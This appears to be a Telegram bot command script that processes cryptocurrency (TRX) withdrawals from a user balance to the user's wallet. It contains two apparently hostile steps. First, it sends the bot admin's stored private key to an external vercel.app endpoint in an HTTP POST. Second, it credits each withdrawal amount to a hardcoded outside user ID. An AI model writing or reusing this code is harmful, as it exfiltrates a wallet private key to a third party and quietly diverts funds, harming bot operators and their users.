/*CMD
  command: with
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: *📤 Enter the amount to be withdrawn to your wallet:*
  keyboard: 
  aliases: 
CMD*/

function NumericWith(n) {
  return !isNaN(parseFloat(n)) && isFinite(n)
}
var value = message
if (!NumericWith(value)) {
  Bot.sendMessage("*📛 Invalid number*", { is_reply: true })
  return
}
var inv = Libs.ResourcesLib.userRes("balance")
var z = "5019879073"
if (value < 9.99999) {
  Bot.sendMessage("*❌ Invalid amount*")
  return
}

if (value > inv.value()) {
  Bot.sendMessage("*❌ Invalid amount*")
  return
}
Bot.sendMessage("*⬆️ Processing retirement...*")
let wit = Libs.ResourcesLib.userRes("withdraw");
let invi = Libs.ResourcesLib.anotherUserRes("invest", z)
let witg = Libs.ResourcesLib.anotherChatRes("withdraw", "global");
invi.add(+message)
inv.add(-message)
wit.add(+message)
witg.add(+message)
var privatekey = Bot.getProperty("privateadminkey");
var wallet = User.getProperty("wl");
var dp = message*1000000
let amo = message 
User.setProperty("amo",amo,"string")
HTTP.post( {
    url: "https://srtronxd.vercel.app/sendtrx",
    success: '/onwith',
    body:  {receiver : wallet, amount : dp ,private_key : privatekey}
})
